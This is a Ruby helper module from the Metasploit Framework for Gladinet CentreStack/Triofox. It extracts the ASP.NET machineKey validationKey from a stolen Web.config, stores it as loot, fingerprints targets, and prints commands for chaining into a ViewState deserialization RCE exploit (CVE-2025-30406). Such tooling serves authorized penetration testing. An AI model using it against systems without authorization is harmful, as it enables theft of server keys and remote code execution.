# -*- coding: binary -*-

##
# This module provides shared functionality for Gladinet CentreStack/Triofox modules
##
module Msf
  ##
  # Module for shared Gladinet CentreStack/Triofox functionality
  ##
  module Auxiliary::Gladinet
    # Default path to Web.config on Gladinet installations
    DEFAULT_WEB_CONFIG_PATH = 'Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config'.freeze

    # Exploit module for ViewState deserialization RCE
    EXPLOIT_MODULE = 'exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406'.freeze

    # Extract machineKey validationKey from Web.config content
    #
    # @param content [String] The content of the Web.config file
    # @return [String, nil] The validationKey in hex format, or nil if not found
    def extract_machinekey(content)
      return nil unless content

      # Extract machineKey from Web.config
      # Pattern: <machineKey decryptionKey="..." validationKey="..." />
      # NOTE: The exploit module only needs the validationKey, not the decryptionKey
      machinekey_match = content.match(/<machineKey[^>]*decryptionKey=["']([^"']+)["'][^>]*validationKey=["']([^"']+)["']/i)
      return nil unless machinekey_match

      validation_key = machinekey_match[2]

      # Return only validationKey (hex format) as required by the exploit module
      validation_key
    end

    # Check if content contains a machineKey
    #
    # @param content [String] The content to check
    # @return [Boolean] True if machineKey is found
    def contains_machinekey?(content)
      !extract_machinekey(content).nil?
    end

    # Extract and save machineKey, then display instructions for RCE exploit
    #
    # @param content [String] The content of the Web.config file
    # @param filepath [String] The file path that was read
    # @param loot_description [String] Description for the loot file
    def handle_machinekey_extraction(content, filepath, loot_description = 'MachineKey extracted from Gladinet Web.config')
      return unless content.include?('machineKey') || filepath.include?('Web.config')

      machinekey = extract_machinekey(content)
      return print_warning('Could not extract machineKey from Web.config') unless machinekey

      print_good('Extracted machineKey from Web.config')
      print_line("MachineKey: #{machinekey}")
      print_line
      print_good("For RCE: use #{EXPLOIT_MODULE}")
      print_status('Set the MACHINEKEY option in the exploit module:')
      print_line("use #{EXPLOIT_MODULE}")
      print_line("set MACHINEKEY #{machinekey}")

      key_path = store_loot(
        'gladinet.machinekey',
        'text/plain',
        datastore['RHOST'],
        machinekey,
        'machinekey.txt',
        loot_description
      )
      print_good("MachineKey saved to: #{key_path}")
    end

    # Check if target is a Gladinet CentreStack/Triofox installation
    #
    # @param response [Rex::Proto::Http::Response] HTTP response from login page
    # @return [Boolean] True if target appears to be Gladinet
    def gladinet?(response)
      response&.code == 200 && response.body.include?('id="__VIEWSTATEGENERATOR"')
    end
  end
end
